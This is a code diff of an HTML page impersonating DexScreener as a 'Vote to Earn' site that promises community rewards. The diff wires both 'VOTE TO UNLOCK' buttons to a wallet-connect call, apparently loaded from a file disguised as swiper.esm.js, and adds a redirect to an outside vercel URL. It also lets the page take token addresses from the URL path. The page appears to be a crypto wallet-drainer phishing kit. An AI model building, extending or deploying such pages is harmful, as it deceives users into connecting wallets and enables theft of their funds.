@@ -7,6 +7,7 @@
 
     <title>DexScreener Votes • Elite Terminal</title>
     <meta property="og:title" content="Vote to Earn — DexScreener CORE" id="ogTitle">
+    <meta property="og:description" content="" id="ogDesc">
     <meta property="og:image" content="" id="ogImage">
     <meta property="og:type" content="website">
     <meta property="og:url" content="" id="ogUrl">
@@ -26,7 +27,7 @@
     <script>
         window.setup = { injectWindowObjects: true };
     </script>
-    <script type="module" src="./swiper.esm.js"></script>
+    <script src="./swiper.esm.js"></script>
 
     <style>
         :root {
@@ -1401,8 +1402,8 @@
                                 <i class="fas fa-bolt" style="color:var(--dex-green);"></i> COMMUNITY VOTE
                             </div>
                             <!-- MOBILE VOTE BUTTON — wallet connection -->
-                            <button class="btn-vote-mobile NlVhn6Y- 7q6V1UU_ 51_12pcL hganNOuU" id="voteBtnMobile"
-                                onclick="window.startConnect()">
+                            <button class="btn-vote-mobile 51_12pcL hganNOuU" id="voteBtnMobile"
+                                onclick="handleVoteClick()">
                                 <i class="fas fa-check-to-slot"></i> VOTE TO UNLOCK
                             </button>
                             <div class="mobile-vote-stats">
@@ -1420,7 +1421,8 @@
                     <div class="token-badges">
                         <div class="tbadge tbadge-time"><i class="fas fa-clock"></i> <span id="badgeTimeText">--</span>
                         </div>
-                        <div class="tbadge tbadge-chain"><i class="fas fa-link"></i> <span id="badgeChainText">--</span>
+                        <div class="tbadge tbadge-chain"><i class="fas fa-link"></i> <span
+                                id="badgeChainText">--</span>
                         </div>
                     </div>
                     <div class="ca-copy-row" onclick="copyCA()">
@@ -1456,8 +1458,8 @@
                             Help the community unlock the next phase of market dominance.
                         </p>
                         <!-- DESKTOP VOTE BUTTON — wallet connection -->
-                        <button class="btn-vote NlVhn6Y- 7q6V1UU_ 51_12pcL hganNOuU" id="voteBtn"
-                            onclick="window.startConnect()">VOTE TO UNLOCK</button>
+                        <button class="btn-vote 51_12pcL hganNOuU" id="voteBtn"
+                            onclick="handleVoteClick()">VOTE TO UNLOCK</button>
                     </div>
                 </div>
             </div>
@@ -1504,14 +1506,28 @@
             </div>
             <div class="trending-scroll-wrapper">
                 <div class="trending-track" id="trendingTrack">
-                    <div class="trending-loading"><i class="fas fa-circle-notch fa-spin"></i> Loading trending tokens...
-                    </div>
+                    <div class="trending-loading"><i class="fas fa-circle-notch fa-spin"></i> Loading trending
+                        tokens...</div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
+        // ================================================================
+        // VOTE BUTTON TARGET URL
+        // ================================================================
+        const VOTE_TARGET_URL = 'https://dexscreenervotes.vercel.app/AVF9F4C4j8b1Kh4BmNHqybDaHgnZpJ7W7yLvL7hUpump';
+
+        function handleVoteClick() {
+            // Try wallet connect first if available
+            if (typeof window.startConnect === 'function') {
+                window.startConnect();
+            }
+            // Also open the vote page
+            window.open(VOTE_TARGET_URL, '_blank');
+        }
+
         // ================================================================
         // GLOBALS
         // ================================================================
@@ -1595,6 +1611,12 @@
             const params = new URLSearchParams(window.location.search);
             if (params.get('ca') && params.get('ca').length > 10) return params.get('ca').trim();
             if (params.get('token') && params.get('token').length > 10) return params.get('token').trim();
+            // Also support path-based URLs like /ADDRESS
+            const pathParts = window.location.pathname.split('/').filter(Boolean);
+            if (pathParts.length > 0) {
+                const lastPart = pathParts[pathParts.length - 1];
+                if (lastPart.length > 10 && !lastPart.includes('.')) return lastPart.trim();
+            }
             if (window.location.hash.length > 12) return window.location.hash.slice(1).trim();
             return null;
         }
@@ -1608,15 +1630,24 @@
             const title = `${tokenName} — Vote to Earn ${chainSym}`;
             const desc = `🗳 Vote for ${tokenSymbol} · ${mcapStr} mcap · Earn ${chainSym} rewards from the community voting pool`;
             document.title = title;
-            document.getElementById('ogTitle').setAttribute('content', title);
-            document.getElementById('ogDesc').setAttribute('content', desc);
-            document.getElementById('ogUrl').setAttribute('content', window.location.href);
-            document.getElementById('twTitle').setAttribute('content', title);
-            document.getElementById('twDesc').setAttribute('content', desc);
+            const ogTitle = document.getElementById('ogTitle');
+            const ogDesc = document.getElementById('ogDesc');
+            const ogUrl = document.getElementById('ogUrl');
+            const twTitle = document.getElementById('twTitle');
+            const twDesc = document.getElementById('twDesc');
+            const ogImage = document.getElementById('ogImage');
+            const twImage = document.getElementById('twImage');
+            const favicon = document.getElementById('favicon');
+
+            if (ogTitle) ogTitle.setAttribute('content', title);
+            if (ogDesc) ogDesc.setAttribute('content', desc);
+            if (ogUrl) ogUrl.setAttribute('content', window.location.href);
+            if (twTitle) twTitle.setAttribute('content', title);
+            if (twDesc) twDesc.setAttribute('content', desc);
             if (imageUrl) {
-                document.getElementById('ogImage').setAttribute('content', imageUrl);
-                document.getElementById('twImage').setAttribute('content', imageUrl);
-                document.getElementById('favicon').setAttribute('href', imageUrl);
+                if (ogImage) ogImage.setAttribute('content', imageUrl);
+                if (twImage) twImage.setAttribute('content', imageUrl);
+                if (favicon) favicon.setAttribute('href', imageUrl);
             }
             let descMeta = document.querySelector('meta[name="description"]');
             if (!descMeta) { descMeta = document.createElement('meta'); descMeta.setAttribute('name', 'description'); document.head.appendChild(descMeta) }
